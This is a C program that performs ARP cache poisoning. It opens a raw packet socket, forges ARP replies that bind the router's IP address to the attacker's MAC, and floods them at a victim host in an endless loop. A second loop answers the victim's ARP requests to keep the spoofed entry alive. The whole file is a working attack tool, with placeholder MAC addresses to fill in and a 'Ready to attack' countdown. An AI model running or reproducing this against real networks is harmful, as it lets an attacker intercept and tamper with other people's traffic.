#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <stdint.h>
#include <assert.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <sys/socket.h>

#define RTAX_MAX        8
#define RTAX_IFP	4
#define PACKET_OTHERHOST	3
#define ETH_ALEN    6
#define ETH_P_ARP 0x0806
#define FRAME_SIZE 42
#define ETHERNET_LINK_SIZE 14
#define PF_PACKET 17

#define RTM_IFINFO "IFINFO"
#define FRAME_SIZE 42
#define ETHERNET_LINK_SIZE 14
#define CTL_NET         4 
#define ARP_REQUEST 1
#define ARP_REPLY 2

typedef struct _arp_hdr arp_hdr;
struct _arp_hdr {
  	uint16_t htype;
    	uint16_t ptype;
      	uint8_t hlen;
        uint8_t plen;
	uint16_t opcode;
	uint8_t sender_mac[6];
	uint8_t sender_ip[4];
	uint8_t target_mac[6];
	uint8_t target_ip[4];
};

struct sockaddr_ll
{
	unsigned short int sll_family; /* 一般为AF_PACKET */
	unsigned short int sll_protocol; /* 上层协议 */
	int sll_ifindex; /* 接口类型 */
	unsigned short int sll_hatype; /* 报头类型 */
	unsigned char sll_pkttype; /* 包类型 */
	unsigned char sll_halen; /* 地址长度 */
	unsigned char sll_addr[8]; /* MAC地址 */
};


char* router_ip;
char* victim_ip;



void fill_victims_MAC(uint8_t* buff)
{

/*
	buff[0] = 0xC8;
	buff[1] = 0xD1;
	buff[2] = 0x0B;
	buff[3] = 0xF5;
	buff[4] = 0x82;
	buff[5] = 0xFA;
*/
	
	buff[0] = 0x00;
	buff[1] = 0x00;
	buff[2] = 0x00;
	buff[3] = 0x00;
	buff[4] = 0x00;
	buff[5] = 0x01;
}


void fill_attacker_MAC(uint8_t* buff)
{
	// ***************** Fill in Attacker ( your ) MAC here ************************
	buff[0] = 0x00;
	buff[1] = 0x00;
	buff[2] = 0x00;
	buff[3] = 0x00;
	buff[4] = 0x00;
	buff[5] = 0x02;
}


/* Input: Length of the buffer 
 Output:  pointer to the buffer*/
uint8_t* create_buffer(int len)
{
	if( len<0 )
	{
		printf("Invalid size for buffer\n");
		exit(EXIT_FAILURE);
	}
	
	// Alocate the buffer with the specified size
	uint8_t* buffer = (uint8_t*)malloc(sizeof(uint8_t)*len);
	if( buffer == NULL )
	{
		perror("Error in allocating the memory in create_buffer\n");
		exit(0);
	}
	// Clear the bytes to 0
	if( memset(buffer,0,len) == -1 )
	{
		perror("Error in memset\n");
		exit(0);
	}
	return buffer;
}

/*
int get_if_no(char* if_name)
{
	struct ifreq ifr;
	// find interface length
	size_t if_name_len = strlen(if_name);
	// Check of the namesize fits in the structure
	if (if_name_len<sizeof(ifr.ifr_name)) {
	    memcpy(ifr.ifr_name,if_name,if_name_len);
	    ifr.ifr_name[if_name_len]=0;
	} else {
	    printf("interface name is too long");
	    exit(EXIT_FAILURE);
	}
	
	
	// Open a dummy socket
	int fd = socket(AF_UNIX,SOCK_DGRAM,0);
	if (fd==-1) {
	    printf("socket error in get_if");
	    exit(0);
	}
	
	if (ioctl(fd,SIOCGIFINDEX,&ifr)==-1) {
	    printf(" error in get_if");
	    exit(0);
	}
	
	return ifr.ifr_ifindex;
}*/


int main(int argc, char* argv[])
{
		if( argc != 4 )
		{
			printf("Invalid args\nUsage: Interface router_ip victim_ip\n");
			exit(EXIT_FAILURE);
		}
		router_ip = argv[2];
		victim_ip = argv[3];
		int i;
		int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
		if( fd == -1 )
		{
			perror("Error opening ARP Socket\n");
			exit(EXIT_FAILURE);
		}
		

		printf("\nSocket created!\n");
		
		uint8_t* buffer = create_buffer(FRAME_SIZE);
		
		/* 
			1) Send a ARP Request with the router's IP as the source IP and the attacker's MAC as srcMAC in ARP header,
			dst IP : victim's IP and dst MAC : attacker's MAC
			( Ethernet src: attacker's MAC, dst: victim's MAC )

			2) Victim will give ARP reply to the request, and also cache it.

			3) Victim confirms the validity of the cached entry by sending a reply back to the Attacker.

			4) Attacker will always dissemble as the router and replies back.
		*/
		
		// Fill in the Dest MAC address ( Victim's MAC )
		
		fill_victims_MAC(buffer);

		// Fill in the Src MAC ( Attacker's MAC ) 
		fill_attacker_MAC(buffer+6);
	
		// Fill in ARP protocol code
		uint16_t* opcode = (uint16_t*)(buffer+12);
		*opcode = htons(0x0806);

		arp_hdr* arph = (arp_hdr*)(buffer+14);

		arph->htype = htons(1);
		arph->ptype = htons(0x800);
		arph->hlen = 6;
		arph->plen = 4;
		arph->opcode = htons(2);

		fill_attacker_MAC((uint8_t*)&(arph->sender_mac));
		fill_victims_MAC((uint8_t*)&(arph->target_mac));
		

		inet_pton(AF_INET, router_ip , arph->sender_ip);


		inet_pton(AF_INET, victim_ip, arph->target_ip);


		/* Create a target socket address structure */
		struct sockaddr_ll socket_address;
		socket_address.sll_family   = PF_PACKET;	
		/*we use ARP protocoll above ethernet layer */
		socket_address.sll_protocol = htons(ETH_P_ARP);	

		/*index of the network device*/
		
		socket_address.sll_ifindex  = if_nametoindex(argv[1]);//get_if_no(argv[1]);
		
		//socket_address.sll_ifindex  = 1;

		/*ARP hardware identifier is ethernet*/
		socket_address.sll_hatype   = ARPHRD_ETHER;
	
		/*target is another host*/
		socket_address.sll_pkttype  = PACKET_OTHERHOST;

		/*address length*/
		socket_address.sll_halen    = ETH_ALEN;		
		/*MAC - begin*/
		socket_address.sll_addr[0]  = buffer[0];		
		socket_address.sll_addr[1]  = buffer[1];		
		socket_address.sll_addr[2]  = buffer[2];
		socket_address.sll_addr[3]  = buffer[3];
		socket_address.sll_addr[4]  = buffer[4];
		socket_address.sll_addr[5]  = buffer[5];
		/*MAC - end*/
		//socket_address.sll_addr[6]  = 0x00;/*not used*/
		//socket_address.sll_addr[7]  = 0x00;/*not used*/
		
		printf("Ready to attack\n");
		sleep(1);
		printf("1\n");
		sleep(1);
		printf("2\n");
		sleep(1);
		printf("3\n");
		sleep(1);

		int n = 0;
		while( 1 )
		{
			if( sendto(fd,buffer,42,0,(struct sockaddr*)&socket_address, sizeof(socket_address)) < 0 )
			{
				perror("Error sending\n");
				exit(0);
			}
			printf("ARP Packet %d. Sent to the address %s\n",(n+1),victim_ip);
			fflush(stdout);
			usleep(1000);
			n++;
		}

		// This is optional
		// This can be used, if we send only 1 request to the victim
		// After sending one request, victim's will ask attacker for the spoofed MAC validity, So, we have to serve them
		// Now serve the victim's requests
	
		uint8_t src[6];
		uint8_t dst[6];
		
		fill_victims_MAC(src);
		fill_attacker_MAC(dst);

		while(1)
		{
			// Check if its request and its src mac is same as the victim's MAC	

			memset(buffer,0,42);
			
			if( recv(fd, buffer, 42, 0) == -1 )
			{
				perror("");
				exit(0);
			}
			
			if( ( memcmp(buffer,dst,6) | memcmp(buffer+6,src,6) ) == 0 )
			{
				arp_hdr* hdr = (arp_hdr*)(buffer+14);
				if( hdr->opcode == htons(1) )
				{
					hdr->opcode = htons(2);
					
					// Fill victim's entries
					inet_pton(AF_INET, victim_ip,hdr->target_ip);
					fill_victims_MAC((uint8_t*)hdr->target_mac);
							
					// Fill attacker's entries
					
					inet_pton(AF_INET, router_ip,hdr->sender_ip);
					fill_attacker_MAC((uint8_t*)hdr->sender_mac);

					uint8_t temp[6];
					memcpy(temp,buffer,6);
					memcpy(buffer,buffer+6,6);
					memcpy(buffer+6,temp,6);

					
					if( sendto(fd,buffer,42,0,(struct sockaddr*)&socket_address, sizeof(socket_address)) < 0 )
					{
						perror("Error sending\n");
						exit(0);
					}
					printf("Replied succesfully\n");
				}
			}
		}
		free(buffer);
}

